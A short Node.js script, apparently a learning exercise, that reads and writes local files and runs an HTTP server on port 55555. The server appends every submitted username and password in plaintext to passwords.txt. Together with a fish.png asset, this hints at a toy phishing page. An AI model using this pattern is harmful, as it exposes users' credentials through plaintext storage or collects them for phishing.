const fs = require('fs')
const path = require('path')
const http = require('http');
const querystring = require("querystring");

const file1 = fs.readFileSync(path.join('./content', 'file1.txt'), 'utf-8');
console.log(file1);

fs.writeFileSync(path.join('./content', 'file3.txt'), 'Hello world :))');

fs.readFile(path.join('./content', 'file2.txt'), 'utf-8', (err, result) => {
    if (err) {
        console.log(`Error reading the file`);
        return;
    }
    console.log(result);
});

const index = fs.readFileSync('index.html', 'utf-8');
const fishImg = fs.readFileSync('fish.png')

const server = http.createServer((req, res) => {
    // console.log("=== NEW REQUEST ===");
    // console.log("Method:", req.method);
    // console.log("URL:", req.url);
    // console.log("Headers:", req.headers);
    
    if (req.method === "POST") {
        let body = ""

        req.on('data', (chunk) => {
            body += chunk
        })

        req.on('end', () => {
            const details = querystring.parse(body)
            fs.appendFile(path.join('./content', 'passwords.txt'), `${details.username} ${details.password}\n`, (err) => {
                if (err) throw err
                console.log("Error")
            })
        })
    }

    res.write(index);
    res.end();
})

server.listen(55555)